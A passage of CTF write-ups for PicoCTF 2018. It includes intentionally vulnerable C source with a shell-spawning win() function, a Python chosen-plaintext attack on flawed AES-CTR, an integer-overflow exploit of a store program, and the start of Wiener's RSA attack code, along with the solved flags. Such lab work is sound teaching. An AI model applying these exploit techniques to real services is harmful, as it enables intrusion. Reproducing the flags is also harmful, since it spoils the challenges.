13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">address</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">value</span><span class="p">;</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?"</span><span class="p">);</span>

  <span class="n">scanf</span><span class="p">(</span><span class="s">"%x"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">address</span><span class="p">);</span>

  <span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"Okay, now what value would you like to write to 0x%x"</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

  <span class="n">scanf</span><span class="p">(</span><span class="s">"%x"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>

  <span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"Okay, writing 0x%x to 0x%x"</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

  <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">address</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Okay, exiting now...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

<span class="p">}</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="binary-exploitation-250-rop-chain"> Binary Exploitation 250: rop chain <a href="/CTF-writeups-public/writeups/PicoCTF_2018/70-binary-exploitation-250-rop-chain.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Can you exploit the <a href="./writeupfiles/rop">following program</a> and get the flag? You can findi the program in /problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9 on the shell server? <a href="./writeupfiles/rop.c">Source.</a></p><h2 id="hints"><span class="mr-2">Hints</span><a href="#hints" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Try and call the functions in the correct order!<li>Remember, you can always call main() again!</ul><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="general-skills-350-roulette"> General Skills 350: roulette <a href="/CTF-writeups-public/writeups/PicoCTF_2018/71-general-skills-350-roulette.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This Online <a href="writeupfiles/roulette">Roulette Service</a> is in Beta. Can you find a way to win $1,000,000,000 and get the flag? Source.</p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 48312</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="forensics-400-malware-shops"> Forensics 400: Malware Shops <a href="/CTF-writeups-public/writeups/PicoCTF_2018/72-forensics-400-malware-shops.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There has been some malware detected, can you help with the analysis?</p><p><img src="writeupfiles/plot.png" alt="" /></p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 46168</code>.</p><p>More info:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>You've been given a dataset of about 500 malware binary files that have
been found on your organization's computers. Whenever you find more malware,
you want to be able to tell if you've seen a file like this before.

Binary files are hard to understand. When code is written, there are several
more steps before it becomes software. Some parts of this process are:
i.  Compiling, which turns human-readable source code into assembly code.
    Assembly code is difficult for humans to read, but it closely mimics the most
    basic raw instructions that a computer needs in order to run a program.
ii. Assembling, which turns assembly code into machine code. Machine code is
    impossible for humans to read, but this representation is what a computer
    actually needs to execute.

The malware binary files that were given to you to analyze are all in machine
code, but luckily, you were able to run a program called a disassembler to
turn them back into assembly code.

Assembly code contains *instructions* which tell a computer how to update
its own internal memory, and its progress through reading the assembly code
itself. For instance, the `jmp` instruction means "jump to executing a
different instruction", and the `add` instruction means "add two numbers and
store the result in memory".

Your dataset contains data about all the malware files, including their
file hash, which serves as a name, and the counts of all of the `jmp` and `add`
instructions.

Malware attackers often release many slightly different versions of the same
malware over time. These different versions always have totally different
hashes, but they are likely to have similar numbers of `jmp` and `add`
instructions.
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>You'll need to consult the file `clusters.png` to answer the following questions.


How many attackers created the malware in this dataset?
5
Correct!


In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 628e79cf? Indicate your answer by entering that file's hash.
       hash  jmp_count  add_count
0  628e79cf       17.0       18.0
1  1f2c7915       18.0       60.0
2  6e7d554a       10.0       42.0
3  a55f572c       30.0       37.0
4  f118fcd7       36.0       13.0
5  97b1425e       35.0       30.0
6  a163e543       18.0       71.0
7  ebaf5ccd       11.0       18.0
8  9059414f       38.0       13.0
9  c30ea3fe       18.0       37.0
ebaf5ccd
Correct!


Great job. You've earned the flag: picoCTF{w4y_0ut_dea1794b}
</pre></table></code></div></div><p>I do not know how they got 5. I saw three peaks and one spurious point at 0, 0. I guessed until I got past the first one and then ebaf5ccd was the only thing remotely close in terms of jmp/adds.</p><h2> Flag</h2><code> picoCTF{w4y_0ut_dea1794b} </code><hr><h1 id="reversing-400-radix-s-terminal"> Reversing 400: Radix’s Terminal <a href="/CTF-writeups-public/writeups/PicoCTF_2018/73-reversing-400-radixs-terminal.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Can you find the password to <a href="./writeupfiles/radix">Radix’s login?</a> You can also find the executable in /problems/radix-s-terminal_0_b6b476e9952f39511155a2e64fb75248?</p><p><strong>Solution</strong><br /> Run strings on the binary and find the string:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cGljb0NURntiQXNFXzY0X2VOQ29EaU5nX2lTX0VBc1lfNDE3OTk0NTF9
</pre></table></code></div></div><p>The hint suggests base64 encoding, base64 decode this for the flag.</p><h2> Flag</h2><code> picoCTF{bAsE_64_eNCoDiNg_iS_EAsY_41799451} </code><hr><h1 id="reversing-400-assembly-3"> Reversing 400: assembly-3 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/74-reversing-400-assembly-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What does <code class="language-plaintext highlighter-rouge">asm3(0xf238999b,0xda0f9ac5,0xcc85310c)</code> return?</p><p>Submit the flag as a hexadecimal value (starting with ‘0x’).</p><p>NOTE: Your submission for this question will NOT be in the normal flag format.<br /> Source located in the directory at <code class="language-plaintext highlighter-rouge">/problems/assembly-3_2_504fe35f4236db611941d162e2abc6b9</code>.</p><pre><code class="language-asm">.intel_syntax noprefix
.bits 32

.global asm3

asm3:
        push    ebp
        mov     ebp,esp
        mov     eax,0xb6
        xor     al,al
        mov     ah,BYTE PTR [ebp+0x8]
        sal     ax,0x10
        sub     al,BYTE PTR [ebp+0xf]
        add     ah,BYTE PTR [ebp+0xd]
        xor     ax,WORD PTR [ebp+0x12]
        mov     esp, ebp
        pop     ebp
        ret
</code></pre><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We manually walk through the program:</p><pre><code class="language-asm">.intel_syntax noprefix
.bits 32

.global asm3

# call: asm3(0xf238999b,    0xda0f9ac5,    0xcc85310c)
#            0xf2 38 99 9b  0xda 0f 9a c5  0xcc 85 31 0c
#   ebp+        b  a  9  8     f  e  d  c    13 12 11 10
# OR:
#         9b  99  38  f2  c5  9a  0f  da  0c  31  85  cc
#   ebp+  8   9   a   b   c   d   e   f   10  11  12  13

asm3:
        push    ebp
        mov     ebp,esp
        mov     eax,0xb6               ;
        xor     al,al                  ;
        mov     ah,BYTE PTR [ebp+0x8]  ; 0x9b
        sal     ax,0x10                ;
        sub     al,BYTE PTR [ebp+0xf]  ; 0xda
        add     ah,BYTE PTR [ebp+0xd]  ; 0x9a
        xor     ax,WORD PTR [ebp+0x12] ; 0xcc85
        mov     esp, ebp
        pop     ebp
        ret
</code></pre><p>We can try to do this by hand, but much easier to use <a href="http://carlosrafaelgn.com.br/asm86/">this emulator</a>. Since we cannot use that to calculate the values of <code class="language-plaintext highlighter-rouge">BYTE PTR [ebp+...]</code> we need to be careful how we’re doing that by hand. Normally we see <code class="language-plaintext highlighter-rouge">DBL WORD PTR[ebp + 0x8/0xc/...]</code> which are nicely aligned, but this one includes access that is not aligned to integer boundaries. The numbers are stored in a little endian format in memory, so when we’re accessing them we need to be careful about that.</p><p>The eax/ax/al/ah registers are as in <a href="https://wiki.skullsecurity.org/index.php?title=Registers">this documentation</a>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>       |-------------------|
32-bit |        eax        |
       |-------------------|
16-bit |         |   ax    |
       |-------------------|
 8-bit |    |    | ah | al |
       |-------------------|
</pre></table></code></div></div><p>We put the following program into the emulator and step through the program and keep an eye on the<br /> value of eax (comments show value of eax at each step):</p><pre><code class="language-asm">asm3:
        push    ebp
        mov     ebp,esp
        mov     eax,0xb6        ; eax = 0x000000B6
        xor     al,al           ; eax = 0x00000000
        mov     ah,0x9b         ; eax = 0x00009b00
        sal     ax,0x10         ; eax = 0x00000000
        sub     al,0xda         ; eax = 0x00000026
        add     ah,0x9a         ; eax = 0x00009a26
        xor     ax,0xcc85       ; eax = 0x000056a3
        mov     esp, ebp
        pop     ebp
        ret                     ; return eax
</code></pre><p>so final value is <code class="language-plaintext highlighter-rouge">0x56a3</code>, which is our flag</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="cryptography-400-electric"> Cryptography 400: eleCTRic <a href="/CTF-writeups-public/writeups/PicoCTF_2018/75-cryptography-400-electric.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You came across a custom server that Dr Xernon’s company eleCTRic Ltd uses. It seems to be storing some encrypted files. Can you get us the flag?</p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 56215</code>.</p><p><a href="./writeupfiles/eleCTRic.py">Source.</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect to the service and find that there is a text file containing the flag, but we must know the “share code” to open it. We can also create files by giving name and content of file, and obtain a share code.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>Initializing Problem...
Welcome to eleCTRic Ltd's Safe Crypto Storage
---------------------------------------------

Choices:
  E[n]crypt and store file
  D[e]crypt file
  L[i]st files
  E[x]it
Please choose: i

Files:
  flag_27e6d23c575c14ba2ee8.txt


Choices:
  E[n]crypt and store file
  D[e]crypt file
  L[i]st files
  E[x]it
Please choose: n

Name of file? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Data? test
Share code:
wjIPDsHOyoEaAoabEGJUF8IyDw7BzsqBGgKGmxBiVBeNJxYb
</pre></table></code></div></div><p>We find out through some testing that the share only depends on the name of the file, not the contents.</p><p>We ask it to encrypt 32 a’s (64 bits), and see that here the key is repeated twice,</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>filename:   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt (32 a's)
share:      wjIPDsHOyoEaAoabEGJUF8IyDw7BzsqBGgKGmxBiVBeNJxYb
xor (hex):  c2320f0ec1ceca811a02869b10625417 c2320f0ec1ceca811a02869b106254178d27161b
</pre></table></code></div></div><p>this is using AES in CTR mode without but without changing the value of the counter:</p><p><img src="writeupfiles/aesctr.jpeg" alt="" /></p><p>So basically it is XOR’ing every 16 bytes with the same value. And since XOR is reversible, we can find out this value easily by asking it to create a file for us. Since we can choose the file name ourselves, this is a chosen plaintext attack, and we can now:</p><ul><li>XOR our chosen filename with the share code generated for it to find the encryption key<li>then XOR this key with the name of the flag file to find it’s share code<li>Ask service to decrypt by providing the share code we found for the flag file</ul><p>We write a little python script that will find the share code for the flag file, given the name of the flag file, and the share code it gave us when we asked it to create a file named <code class="language-plaintext highlighter-rouge">abcdefghijklmnopqrstuvwxyz.txt</code></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>
<span class="kn">import</span> <span class="n">sys</span>


<span class="k">def</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="c1"># if b shorter than a it will be repeated
</span>    <span class="n">c</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
        <span class="n">c</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">b</span><span class="p">)])</span>
    <span class="k">return</span> <span class="n">c</span>


<span class="k">def</span> <span class="nf">get_share_code</span><span class="p">(</span><span class="n">flag_fname</span><span class="p">,</span> <span class="n">known_share</span><span class="p">):</span>

    <span class="n">known_pt_string</span> <span class="o">=</span> <span class="sh">'</span><span class="s">abcdefghijklmnopqrstuvwxyz.txt</span><span class="sh">'</span>
    <span class="n">known_ct</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">known_share</span><span class="p">)</span>

    <span class="n">known_pt</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="nf">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">known_pt_string</span><span class="p">))</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">known_ct</span><span class="p">,</span> <span class="n">known_pt</span><span class="p">)</span>

    <span class="n">flag</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="nf">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">flag_fname</span><span class="p">))</span>
    <span class="n">pt</span> <span class="o">=</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>

    <span class="n">share</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="n">share</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">get_share_code</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

    <span class="c1"># flag file: flag_4e2c84b4994eac36bec9.txt
</span>    <span class="c1"># share for abcd..z.txt: VhtSQN/bJkGGTTEqpp3g9UYLQlDPyzZRll10MrOH
</span>    <span class="c1"># share for flag: URVQQ+WJJBuMH24k/8q2sVIYUheM3yRK1gkuPr8=
</span></pre></table></code></div></div><p>So we log in to netcat, look up the name of the flag file we want to read<br /> (different each time we connect), and ask it to encrypt a file named <code class="language-plaintext highlighter-rouge">abcdefghijklmnopqrstyvwxyz</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 56215
Initializing Problem...
Welcome to eleCTRic Ltd<span class="s1">'s Safe Crypto Storage
---------------------------------------------

Choices:
  E[n]crypt and store file
  D[e]crypt file
  L[i]st files
  E[x]it
Please choose: i

Files:
  flag_4e2c84b4994eac36bec9.txt

Choices:
  E[n]crypt and store file
  D[e]crypt file
  L[i]st files
  E[x]it
Please choose: n

Name of file? abcdefghijklmnopqrstuvwxyz
Data? bla
Share code:
VhtSQN/bJkGGTTEqpp3g9UYLQlDPyzZRll10MrOH
</span></pre></table></code></div></div><p>then we run our decryption script</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ python3 electric.py flag_4e2c84b4994eac36bec9.txt VhtSQN/bJkGGTTEqpp3g9UYLQlDPyzZRll10MrOH
b'URVQQ+WJJBuMH24k/8q2sVIYUheM3yRK1gkuPr8='
</pre></table></code></div></div><p>So now we know the share code for the flag file and can ask the service to decrypt it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>Choices:
  E[n]crypt and store file
  D[e]crypt file
  L[i]st files
  E[x]it
Please choose: e

Share code? URVQQ+WJJBuMH24k/8q2sVIYUheM3yRK1gkuPr8=
Data:
picoCTF{alw4ys_4lways_Always_check_int3grity_c469e9ba}
</pre></table></code></div></div><p>\o/</p><h2> Flag</h2><code> picoCTF{alw4ys_4lways_Always_check_int3grity_c469e9ba} </code><hr><h1 id="web-exploitation-400-fancy-alive-monitoring"> Web Exploitation 400: fancy-alive-monitoring <a href="/CTF-writeups-public/writeups/PicoCTF_2018/76-web-exploitation-400-fancy-alive-monitoring.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>One of my school mate developed an alive monitoring tool. Can you get a flag from http://2018shell1.picoctf.com:56517 ?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="reversing-400-keygen-me-1"> Reversing 400: keygen-me-1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/77-reversing-400-keygen-me-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Can you generate a valid product key for the <a href="./writeupfiles/keygen-me-1">validation program</a> in /problems/keygen-me-1_0_2b06ee615c1b7021f1eff5829aae5006</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="general-skills-400-store"> General Skills 400: Store <a href="/CTF-writeups-public/writeups/PicoCTF_2018/78-general-skills-400-store.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We started a little store, can you buy the flag? <a href="./writeupfiles/store.c">Source.</a> Connect with 2018shell1.picoctf.com 5795.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Playing around with a local copy, trying to buy 1000000000 imitation flags<br /> overflows and wraps around, giving you a very positive balance. Then you can<br /> just buy the real flag.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>Welcome to the Store App V1.0
World's Most Secure Purchasing App
[1] Check Account Balance
[2] Buy Stuff
[3] Exit
 Enter a menu selection
2
Current Auctions1
[1] I Can't Believe its not a Flag!
[2] Real Flag
Imitation Flags cost 1000 each, how many would you like?
1000000000
Your total cost is: -727379968
Your new balance: 727381068
Welcome to the Store App V1.0
World's Most Secure Purchasing App
[1] Check Account Balance
[2] Buy Stuff
[3] Exit
 Enter a menu selection
2
Current Auctions
[1] I Can't Believe its not a Flag!
[2] Real Flag
2
A genuine Flag costs 100000 dollars, and we only have 1 in stock
Enter 1 to purchase1
YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{numb3r3_4r3nt_s4f3_dbd42a50} </code><hr><h1 id="cryptography-450-super-safe-rsa-2"> Cryptography 450: Super Safe RSA 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/79-cryptography-450-super-safe-rsa-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Wow, he made the exponent really large so the encryption MUST be safe, right?!</p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 47295</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect to the service and get a set of RSA parameters</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ nc 2018shell1.picoctf.com 47295

c: 25768046345727464502597520221366212769169471825365967634630931748647232910338751793422711728554855006367814407810621525958992286707789113053995635463407498955539964935155035496760107228272520704862671855993478994453136635235568232731879221074380473331175949428476338755714015215366964946019773206537518303256
n: 62521990254455432739739098327679950602675797333442676086848188780355806233664586212815747058830242509072941471918606448376223071702950597243409185734520501054880754651705541198856749099694484071501292887111220558418712756088261843103763153296918795811242273836779338023623847026392962143077450363442487934689
e: 11376394003149076634899198125602078382240701942434104587266195449986160326784109595920286001442706286840942170874916183177235151594636401912319064648735169214636981775404170094629988884687077578483030764227613917415801022670556750159920041801902797676162135948461328656879638396798506273263833645665345860373
</pre></table></code></div></div><p>This uses an extremely large public exponent (<code class="language-plaintext highlighter-rouge">e</code>) which is potentially just as bad as using a very small one (like the <a href="#cryptography-250-safe-rsa">Safe RSA</a> challenge) and might imply a very small private exponent (<code class="language-plaintext highlighter-rouge">d</code>). If that is the case, we can use <a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener’s attack</a> to find <code class="language-plaintext highlighter-rouge">d</code> given <code class="language-plaintext highlighter-rouge">e</code> and <code class="language-plaintext highlighter-rouge">N</code>.</p><p>We find <a href="https://github.com/pablocelayes/rsa-wiener-attack">this python library</a> that uses some results about continued fractions approximations to infer the private key from public key in the cases the encryption exponent is too small or too large. We use it to find d:</p><p>(see also <a href="writeupfiles/supersafersa2.py">supersafersa2.py</a> )</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">gmpy2</span>


<span class="k">def</span> <span class="nf">isqrt</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">
    Calculates the integer square root
    for arbitrary large nonnegative integers
    </span><span class="sh">'''</span>
